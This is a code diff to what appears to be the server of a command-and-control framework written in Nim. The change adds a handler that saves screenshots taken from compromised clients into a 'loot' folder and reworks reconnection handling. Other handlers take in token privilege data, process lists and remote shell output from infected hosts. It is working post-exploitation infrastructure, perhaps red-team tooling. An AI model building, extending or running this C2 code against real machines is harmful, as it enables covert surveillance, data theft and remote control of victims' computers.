@@ -1,4 +1,6 @@
-import asyncdispatch, ws, asyncfutures, strutils, strformat, json, base64, md5
+import asyncdispatch, asyncfutures, strutils, strformat, json, base64, md5, tables, times
+
+import pixie, ws
 
 import types, logging, communication
 
@@ -46,30 +48,32 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
         client.isAdmin = response["data"]["isAdmin"].getBool()
         client.isAdmin = response["data"]["isAdmin"].getBool()
         client.hash = client[].generateClientHash()
-        for otherClient in server.clients:
-          if otherClient.hash == client.hash and otherClient.id != client.id:
-            let oldClientId = client.id
-          
-            # migrating client  
-            var tcpSocket = getTcpSocket(client[])
-            tcpSocket.id = otherClient.id
-            client[] = otherClient
-            client.connected = true
-            cReconnected client[]
+        if parseBool(server.configuration.getOrDefault("handle_reconnections", "true")):
+          for otherClient in server.clients:
+            if otherClient.hash == client.hash and otherClient.id != client.id:
+              let oldClientId = client.id
+            
+              # migrating client  
+              var tcpSocket = getTcpSocket(client[])
+              tcpSocket.id = otherClient.id
+              client[] = otherClient
+              client.connected = true
+              cReconnected client[]
 
-            # remove old client
-            for c in server.clients:
-              if c.id == oldClientId:
-                server.clients.delete(
-                  server.clients.find c
-                )
+              # remove old client
+              for c in server.clients:
+                if c.id == oldClientId:
+                  server.clients.delete(
+                    server.clients.find c
+                  )
         if not client.loaded:
           cConnected client[]
           client.loaded = true
       of "output":
         let output = response["data"]["output"].getStr()
         let category = response["data"]["category"].getStr()
-        if category == "TOKENINFO":
+        case category 
+        of "TOKENINFO":
           let tokenInformation = parseJson(decode(output))
           task.output = tokenInformation
           client.tokenInformation.integrityLevel.sid = tokenInformation["tokenIntegrity"].getStr("")
@@ -79,7 +83,7 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
               name: tokenGroup["name"].getStr(""),
               sid: tokenGroup["sid"].getStr(""),
               domain: tokenGroup["domain"].getStr("")))
-        elif category == "PROCESSES":
+        of "PROCESSES":
           let output = parseJson(decode(output))
           task.output = output
           client.processes = @[]
@@ -87,9 +91,20 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
             client.processes.add((
               name: process["name"].getStr(""),
               id: process["id"].getInt(0)))
-        elif category == "SHELL":
+        of "SHELL":
           task.output = %*{"output": decode(output)}
           logClientOutput client[], category, output
+        of "SCREENSHOT":
+          infoLog "received screenshot from " & $client[]
+          let decodedImage = decode(output)
+          let image = decodeImage(decodedImage)
+          # task.output = %*{
+          #   "file": encode(image.encodeImage(JpegFormat)),
+          #   "format": "jpeg"
+          # }
+          let filePath = "loot/" & $client.id & "/screenshots/screenshot_" & now().format("yyyy-MM-dd-HH-mm-ss") & ".png"
+          image.writeFile(filePath)
+          infoLog "saving screenshot from " & $client[] & " to " & filePath
       of "file":
         task.output = %*{
           "file": response["data"]["path"].getStr(),
